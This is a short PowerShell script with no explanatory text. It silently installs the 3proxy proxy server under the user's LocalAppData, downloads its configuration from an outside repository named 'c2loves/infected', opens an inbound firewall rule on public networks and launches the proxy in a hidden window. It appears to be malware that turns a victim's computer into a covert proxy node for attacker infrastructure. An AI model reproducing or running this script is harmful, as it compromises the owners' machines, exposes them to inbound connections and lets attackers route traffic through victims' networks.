$Url = 'https://github.com/3proxy/3proxy/releases/download/0.9.5/3proxy-0.9.5-lite.zip'
$DestDir = Join-Path $env:LocalAppData 'proxy'
$TempZip = Join-Path $env:TEMP '3proxy-0.9.5-lite.zip'

if (-not (Test-Path -Path $DestDir)) {
    New-Item -Path $DestDir -ItemType Directory -Force | Out-Null
}

try {
    Invoke-WebRequest -Uri $Url -OutFile $TempZip -UseBasicParsing -ErrorAction Stop
} catch {
    exit 1
}

try {
    Expand-Archive -Path $TempZip -DestinationPath $DestDir -Force
} catch {
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($TempZip, $DestDir, $true)
    } catch {
        exit 1
    }
}

Remove-Item -Path $TempZip -Force -ErrorAction SilentlyContinue

New-Item -ItemType Directory -Path "$env:LOCALAPPDATA\proxy\bin" -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/c2loves/infected/refs/heads/main/3proxy.cfg' -OutFile "$env:LOCALAPPDATA\proxy\bin\3proxy.cfg" -UseBasicParsing

$exe = "$env:LOCALAPPDATA\proxy\bin\3proxy.exe"
if (Test-Path $exe) {
    New-NetFirewallRule -DisplayName "Allow 3proxy" -Direction Inbound -Program $exe -Action Allow -Profile Private,Public
}

Start-Process -FilePath "${env:LOCALAPPDATA}\proxy\bin\3proxy.exe" -ArgumentList "${env:LOCALAPPDATA}\proxy\bin\3proxy.cfg" -WindowStyle Hidden
